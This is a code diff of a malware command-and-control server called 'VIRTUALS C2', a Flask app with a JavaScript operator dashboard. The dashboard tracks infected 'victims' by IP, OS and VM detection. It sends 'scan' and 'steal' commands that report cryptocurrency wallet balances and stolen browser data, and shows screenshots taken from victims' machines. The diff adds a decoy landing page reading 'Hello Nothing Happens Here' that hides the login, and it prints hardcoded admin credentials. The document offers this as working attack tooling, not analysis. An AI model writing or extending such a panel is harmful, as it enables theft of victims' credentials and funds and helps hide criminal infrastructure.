 function showDetails(id){const v=state.channels[id];if(!v)return;document.getElementById('victimDetails').innerHTML=`<div class="detail-item"><span class="label">ID</span><span class="value">${v.id}</span></div><div class="detail-item"><span class="label">PC</span><span class="value">${v.pc}</span></div><div class="detail-item"><span class="label">IP</span><span class="value">${v.ip}</span></div><div class="detail-item"><span class="label">OS</span><span class="value">${v.os||'unknown'}</span></div><div class="detail-item"><span class="label">Status</span><span class="value ${v.status==='Online'?'online':'offline'}">${v.status}</span></div><div class="detail-item"><span class="label">VM</span><span class="value" style="color:${v.is_vm?'#cc8888':'#66dd88'}">${v.is_vm?'detected':'clean'}</span></div><div class="detail-item"><span class="label">Commands</span><span class="value">${(state.commands[id]||[]).length}</span></div><div class="detail-item"><span class="label">Browser Data</span><span class="value" style="color:${v.browser_data_stolen?'#66dd88':'#886666'}">${v.browser_data_stolen?'stolen':'waiting'}</span></div>`;}
-function loadScreenshots(id){api('getScreenshots',{victim_id:id},d=>{const el=document.getElementById('screenshotGallery');if(!d.success||!d.screenshots||d.screenshots.length===0){el.innerHTML='<div style="color:#555568;font-size:11px;">none</div>';return;}el.innerHTML=d.screenshots.map(s=>`<div class="screenshot-thumb" onclick="window.open('/screenshots/${s.filename}','_blank')">📷</div>`).join('');});}
+function loadScreenshots(id){api('getScreenshots',{victim_id:id},d=>{const el=document.getElementById('screenshotGallery');if(!d.success||!d.screenshots||d.screenshots.length===0){el.innerHTML='<div style="color:#555568;font-size:10px;">none</div>';return;}el.innerHTML=d.screenshots.map(s=>`<div class="screenshot-thumb" onclick="window.open('/screenshots/${s.filename}','_blank')">📷</div>`).join('');});}
 function updateStats(){const v=Object.values(state.channels);document.getElementById('channelCount').textContent=v.length;document.getElementById('onlineCount').textContent=v.filter(x=>x.status==='Online').length;document.getElementById('vmCount').textContent=v.filter(x=>x.is_vm).length;}
 function addLog(type,content){const el=document.getElementById('logOutput');let cls='system';if(type==='success')cls='success';else if(type==='failed')cls='failed';else if(type==='info')cls='info';const time=new Date().toLocaleTimeString();el.innerHTML='<div class="log-item"><span class="log-time">['+time+']</span><span class="type '+cls+'">'+type+'</span><span class="log-content">'+content+'</span></div>'+el.innerHTML;if(el.children.length>80){el.removeChild(el.lastChild);}}
 function addNotification(title,content){state.notifications.unshift({title,content,time:new Date().toLocaleTimeString()});updateNotifications();}
-function updateNotifications(){const list=document.getElementById('notifList');const badge=document.getElementById('notifBadge');if(state.notifications.length===0){list.innerHTML='<div style="color:#555568;font-size:12px;padding:8px;text-align:center;">No notifications</div>';badge.style.display='none';return;}badge.style.display='inline-block';badge.textContent=state.notifications.length;list.innerHTML=state.notifications.map(n=>`<div class="notif-item"><div class="notif-title">${n.title}</div><div class="notif-content">${n.content}</div><div class="notif-time">${n.time}</div></div>`).join('');}
+function updateNotifications(){const list=document.getElementById('notifList');const badge=document.getElementById('notifBadge');if(state.notifications.length===0){list.innerHTML='<div style="color:#555568;font-size:11px;padding:8px;text-align:center;">No notifications</div>';badge.style.display='none';return;}badge.style.display='inline-block';badge.textContent=state.notifications.length;list.innerHTML=state.notifications.map(n=>`<div class="notif-item"><div class="notif-title">${n.title}</div><div class="notif-content">${n.content}</div><div class="notif-time">${n.time}</div></div>`).join('');}
 function toggleNotifications(){const dd=document.getElementById('notifDropdown');dd.style.display=dd.style.display==='block'?'none':'block';}
 function addMessage(sender,msg,type){const el=document.getElementById('chatMessages');const t=new Date().toLocaleTimeString();let cls='system';if(type==='us')cls='us';else if(type==='victim')cls='victim';else if(type==='embed')cls='embed';el.innerHTML+='<div class="msg"><span class="time">['+t+']</span><span class="sender '+cls+'">'+sender+'</span> '+msg+'</div>';el.scrollTop=el.scrollHeight;}
 function sendCommand(cmd){const channel=state.activeChannel;if(!channel){addMessage('system','no channel selected','system');addLog('failed','No channel selected');return;}addMessage('us','/'+cmd+' → '+channel,'us');addLog('info','Executing '+cmd+' on '+channel);api('sendCommand',{victim_id:channel,command:cmd},d=>{if(d.success){if(!state.commands[channel])state.commands[channel]=[];state.commands[channel].push({command:cmd,result:d.result,time:new Date().toLocaleTimeString()});state.cmdCount++;addMessage('us','success','us');addLog('success','Command '+cmd+' completed');addNotification('Command Executed',cmd+' on '+channel);if(cmd==='scan'&&d.wallets){d.wallets.forEach(w=>{addMessage('wallet','💰 '+w.currency+': '+w.balance+' ($'+w.usd+')','wallet');addLog('info',w.currency+': '+w.balance);});addNotification('Scan Complete',d.wallets.length+' wallets found');}if(d.embed){addEmbed(d.embed);addLog('info',d.embed.title);}if(cmd==='steal'){addNotification('Browser Data Stolen','Data stolen');}showDetails(channel);updateStats();}else{addMessage('us','failed','us');addLog('failed','Command '+cmd+' failed');addNotification('Command Failed',cmd+' failed');}});}
@@ -464,6 +489,10 @@ setInterval(refresh,5000);refresh();setTimeout(loadDemo,500);
 @app.route('/')
 def landing():
     return LANDING_PAGE
+
+@app.route('/login')
+def login_page():
+    return LOGIN_PAGE
 
 @app.route('/dashboard')
 @login_required
@@ -675,11 +704,12 @@ def heartbeat():
 if __name__ == '__main__':
     print("""
     ╔═══════════════════════════════════════════════════════════════╗
-    ║   VIRTUALS C2 - BIGGER UI EDITION                          ║
-    ║   15% Bigger Elements · Space Background · All Features    ║
+    ║   VIRTUALS C2 - LANDING PAGE EDITION                       ║
+    ║   Hello Nothing Happens Here · Hidden Login · Working Auth ║
     ╚═══════════════════════════════════════════════════════════════╝
     """)
     print(f"[*] Server: http://localhost:{PORT}")
-    print(f"[*] Login: admin / virtuals2024")
-    print("[*] ALL ELEMENTS ARE 15% BIGGER")
+    print(f"[*] Landing: http://localhost:{PORT}/")
+    print(f"[*] Login: http://localhost:{PORT}/login")
+    print("[*] Login credentials: admin / virtuals2024")
     app.run(host='0.0.0.0', port=PORT, debug=False)
